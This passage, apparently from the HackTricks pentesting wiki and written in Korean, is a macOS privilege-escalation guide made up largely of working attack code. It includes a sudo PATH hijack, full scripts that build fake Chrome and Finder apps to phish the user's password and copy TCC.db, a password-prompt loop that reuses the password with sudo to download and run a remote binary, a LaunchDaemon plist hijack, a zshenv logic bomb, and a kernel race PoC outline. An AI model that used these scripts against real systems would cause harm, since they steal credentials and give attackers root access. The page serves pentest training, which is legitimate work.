# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

TCC privilege escalation을 찾고 있다면 다음으로 이동하세요:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

**Linux/Unix**에 영향을 미치는 privilege escalation 관련 **대부분의 기술은 MacOS** 시스템에도 영향을 미친다는 점을 참고하세요. 따라서 다음을 확인하세요:


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## User Interaction

### Sudo Hijacking

원본 [Sudo Hijacking technique은 Linux Privilege Escalation 게시물](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking)에서 확인할 수 있습니다.

하지만 macOS는 사용자가 **`sudo`**를 실행할 때 사용자의 **`PATH`**를 **유지**합니다. 즉, 이 공격을 수행하는 또 다른 방법은 피해자가 **sudo를 실행할 때:** 실행하게 될 **다른 binary를 hijack**하는 것입니다.
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
터미널을 사용하는 사용자는 **Homebrew가 설치되어 있을 가능성이 매우 높다**는 점에 유의해야 합니다. 따라서 **`/opt/homebrew/bin`**의 바이너리를 hijack할 수 있습니다.

### Dock Impersonation

일부 **social engineering**을 사용하면 Dock 내부에서 예를 들어 **Google Chrome**을 **impersonate**한 후 실제로 자신의 script를 실행할 수 있습니다:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
몇 가지 제안:

- Dock에 Chrome이 있는지 확인하고, 있는 경우 해당 항목을 **제거**한 다음 Dock array에서 **동일한 위치에** **fake** **Chrome 항목을 추가**합니다.

<details>
<summary>Chrome Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
몇 가지 제안:

- **Dock에서 Finder를 제거할 수 없으므로**, Dock에 추가하려는 경우 가짜 Finder를 실제 Finder 바로 옆에 배치할 수 있습니다. 이를 위해서는 **Dock 배열의 맨 앞에 가짜 Finder 항목을 추가해야 합니다**.
- 다른 방법은 Dock에 배치하지 않고 그냥 여는 것입니다. "Finder가 Finder를 제어하려고 함"이라는 메시지는 그다지 이상하지 않습니다.
- 보기 흉한 대화 상자 없이 비밀번호를 묻지 않고 **root로 escalate**하는 또 다른 방법은, Finder가 privileged action을 수행하기 위해 실제로 비밀번호를 묻게 만드는 것입니다.
- Finder에 새로운 **`sudo`** 파일을 **`/etc/pam.d`**로 복사하도록 요청합니다. (비밀번호를 묻는 prompt에는 "Finder가 sudo를 복사하려고 합니다"라고 표시됩니다.)
- 새로운 **Authorization Plugin**을 복사하도록 Finder에 요청합니다. (파일 이름을 제어할 수 있으므로 비밀번호를 묻는 prompt에는 "Finder가 Finder.bundle을 복사하려고 합니다"라고 표시됩니다.)

<details>
<summary>Finder Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}
{{#endtabs}}

### Password prompt phishing + sudo reuse

Malware는 사용자 상호작용을 악용하여 **sudo를 사용할 수 있는 password를 탈취**하고 이를 programmatically 재사용하는 경우가 많습니다. 일반적인 흐름은 다음과 같습니다.

1. `whoami`로 로그인한 user를 식별합니다.
2. `dscl . -authonly "$user" "$pw"`가 성공을 반환할 때까지 **password prompt를 반복**합니다.
3. credential을 (예: `/tmp/.pass`) cache한 다음 `sudo -S`(stdin을 통한 password)로 privileged action을 수행합니다.

간단한 최소 chain 예시:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
도난당한 password는 이후 **`xattr -c`로 Gatekeeper quarantine을 해제**하고, LaunchDaemons 또는 기타 privileged files를 복사하며, 추가 stages를 non-interactively 실행하는 데 재사용할 수 있습니다.<sup>[[1]](#references)</sup>

## 최신 macOS-specific vectors (2023–2025)

### Deprecated `AuthorizationExecuteWithPrivileges` still usable

`AuthorizationExecuteWithPrivileges`는 10.7에서 deprecated되었지만 **Sonoma/Sequoia에서도 여전히 작동합니다**. 많은 commercial updaters가 신뢰할 수 없는 path와 함께 `/usr/libexec/security_authtrampoline`을 호출합니다. target binary가 user-writable이라면 trojan을 심고 legitimate prompt를 이용할 수 있습니다:
```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```
위의 **masquerading tricks**와 결합하여 신뢰할 수 있어 보이는 password dialog를 표시합니다.


### Privileged helper / XPC 트리아지

많은 최신 third-party macOS privesc는 동일한 패턴을 따릅니다. **root LaunchDaemon**이 **`/Library/PrivilegedHelperTools`**에서 **Mach/XPC service**를 노출한 다음, helper가 **client를 검증하지 않거나**, **너무 늦게 검증하거나**(PID race), 또는 **user-controlled path/script**를 사용하는 **root method**를 노출합니다. 이는 VPN client, game launcher 및 updater에서 발생한 최근 helper bug의 원인이 된 bug class입니다.<sup>[[2]](#references)</sup>

빠른 트리아지 checklist:
```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
echo "== $f =="
codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```
특히 다음과 같은 helper에 주의하세요:

- `launchd`에 job이 계속 로드된 상태로 남아 **uninstall 후에도** 요청을 계속 수락하는 경우
- **`/Applications/...`** 또는 non-root 사용자가 쓸 수 있는 다른 경로에서 script를 실행하거나 configuration을 읽는 경우
- race가 가능한 **PID-based** 또는 **bundle-id-only** peer validation에 의존하는 경우

helper authorization bug에 대한 자세한 내용은 [이 페이지](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md)를 확인하세요.

### PackageKit script environment inheritance (CVE-2024-27822)

Apple이 **Sonoma 14.5**, **Ventura 13.6.7** 및 **Monterey 12.7.5**에서 이를 수정하기 전까지, **`Installer.app`** / **`PackageKit.framework`**를 통한 사용자가 시작한 install은 현재 사용자의 environment 내부에서 **PKG script를 root로 실행**할 수 있었습니다. 즉, **`#!/bin/zsh`**를 사용하는 package는 공격자의 **`~/.zshenv`**를 로드하고, 피해자가 package를 install할 때 이를 **root로 실행**할 수 있었습니다.<sup>[[3]](#references)</sup>

이는 특히 **logic bomb**로서 흥미롭습니다. 사용자의 account에 foothold와 쓸 수 있는 shell startup file만 확보한 다음, 사용자가 취약한 **zsh-based** installer를 실행할 때까지 기다리면 됩니다. 이는 일반적으로 **MDM/Munki** deployment에는 적용되지 않습니다. 이러한 deployment는 root 사용자의 environment 내부에서 실행되기 때문입니다.<sup>[[3]](#references)</sup>
```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```
더 깊이 있는 installer-specific abuse 내용이 필요하다면 [이 페이지](macos-files-folders-and-binaries/macos-installers-abuse.md)도 확인하세요.

### LaunchDaemon plist hijack (CVE-2025-24085 pattern)

LaunchDaemon plist 또는 해당 `ProgramArguments` target이 **user-writable**인 경우, 이를 교체한 다음 launchd가 다시 로드하도록 강제하여 privilege escalation할 수 있습니다:
```bash
sudo launchctl bootout system /Library/LaunchDaemons/com.apple.securemonitor.plist
cp /tmp/root.sh /Library/PrivilegedHelperTools/securemonitor
chmod 755 /Library/PrivilegedHelperTools/securemonitor
cat > /Library/LaunchDaemons/com.apple.securemonitor.plist <<'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.apple.securemonitor</string>
<key>ProgramArguments</key>
<array><string>/Library/PrivilegedHelperTools/securemonitor</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>
PLIST
sudo launchctl bootstrap system /Library/LaunchDaemons/com.apple.securemonitor.plist
```
이 내용은 **CVE-2025-24085**에 대해 공개된 exploit pattern을 따르며, writable plist를 악용해 attacker code를 root 권한으로 실행합니다.

### XNU SMR credential race (CVE-2025-24118)

`kauth_cred_proc_update`의 **race**를 통해 local attacker는 여러 thread에서 `setgid()`/`getgid()` loop를 실행하여 torn `memcpy`가 발생할 때까지 경쟁함으로써 read-only credential pointer(`proc_ro.p_ucred`)를 손상시킬 수 있습니다. 손상에 성공하면 **uid 0**과 kernel memory access를 얻습니다. Minimal PoC structure:
```c
// thread A
while (1) setgid(rand());
// thread B
while (1) getgid();
```
heap grooming을 함께 사용해 pointer가 다시 읽히는 위치에 제어된 데이터를 배치합니다. 취약한 빌드에서는 SIP bypass 요구 사항 없이 안정적인 **local kernel privesc**가 가능합니다.<sup>[[4]](#references)</sup>

### Migration assistant를 통한 SIP bypass ("Migraine", CVE-2023-32369)

이미 root를 획득했더라도 SIP는 system location에 대한 쓰기를 차단합니다. **Migraine** bug는 Migration Assistant entitlement `com.apple.rootless.install.heritable`을 악용해 SIP bypass를 상속하는 child process를 생성하고, 보호된 path(예: `/System/Library/LaunchDaemons`)를 덮어씁니다.<sup>[[5]](#references)</sup> 공격 chain은 다음과 같습니다.

1. 실행 중인 system에서 root를 획득합니다.
2. crafted state를 사용해 `systemmigrationd`를 trigger하고 attacker-controlled binary를 실행합니다.
3. 상속된 entitlement를 사용해 SIP-protected file을 patch하고, reboot 후에도 persistence를 유지합니다.

### NSPredicate/XPC expression smuggling (CVE-2023-23530/23531 bug class)

여러 Apple daemon은 XPC를 통해 **NSPredicate** object를 허용하면서 `expressionType` field만 검증하며, 이 field는 attacker-controlled입니다. 임의의 selector를 평가하는 predicate를 crafting하면 **root/system XPC service**(예: `coreduetd`, `contextstored`)에서 **code execution**을 달성할 수 있습니다. 초기 app sandbox escape와 결합하면 **user prompt 없이 privilege escalation**이 가능합니다. predicate를 deserialize하면서 robust visitor가 없는 XPC endpoint를 찾으십시오.<sup>[[6]](#references)</sup>

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass 및 privilege escalation

**모든 user**(unprivileged user 포함)는 `-o noowners`를 사용해 Time Machine snapshot을 생성하고 mount할 수 있으며, live volume의 ownership check를 bypass하여 해당 snapshot의 **모든 file에 access**할 수 있습니다. 필요한 유일한 privilege는 사용되는 application(예: `Terminal`)에 **Full Disk Access**(`kTCCServiceSystemPolicyAllfiles`)가 부여되어 있는 것입니다.

commands와 전체 설명은 TCC bypasses page에 있습니다:

{{#ref}}
macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
{{#endref}}

## Sensitive Information

다음 정보는 privilege escalation에 유용할 수 있습니다:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

## References

- [1] [Pentest Partners - 2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [CVE-2024-30165: AWS Client VPN for macOS Local Privilege Escalation](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)
- [3] [CVE-2024-27822: macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [4] [CVE-2025-24118 SMR credential race write-up & PoC](https://github.com/jprx/CVE-2025-24118)
- [5] [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [6] [Trellix Advanced Research Center - A New Privilege Escalation Bug Class on macOS and iOS (CVE-2023-23530/23531)](https://www.trellix.com/blogs/research/trellix-advanced-research-center-discovers-a-new-privilege-escalation-bug-class-on-macos-and-ios/)

{{#include ../../banners/hacktricks-training.md}}
